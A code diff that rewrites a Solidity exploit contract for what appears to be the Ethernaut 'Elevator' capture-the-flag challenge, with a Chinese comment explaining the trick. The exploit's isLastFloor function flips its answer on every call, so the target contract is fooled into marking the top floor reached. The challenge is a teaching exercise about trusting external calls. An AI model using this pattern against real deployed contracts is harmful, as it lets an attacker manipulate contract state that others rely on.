@@ -20,15 +20,17 @@ contract Elevator {
   }
 }
 
-contract hack {
-    address instance_address = 0xfeAd619d1eeA30ad8f052dA64EdfCA4F4969e967;
-    Elevator a = Elevator(instance_address);
-    bool public b = true;
-    function isLastFloor(uint) public returns (bool){
-        b = !b;
-        return b;
+contract Exploit {
+    Elevator elevator;
+    bool top = true;
+    constructor(address challenge) public {
+        elevator = Elevator(challenge);
     }
-    function exploit() public{
-        a.goTo(1);
+    function isLastFloor(uint) public returns (bool) {
+        top = !top;  // 调用一次就改一次返回值
+        return top;
+    }
+    function exp() public {
+        elevator.goTo(1);
     }
 }
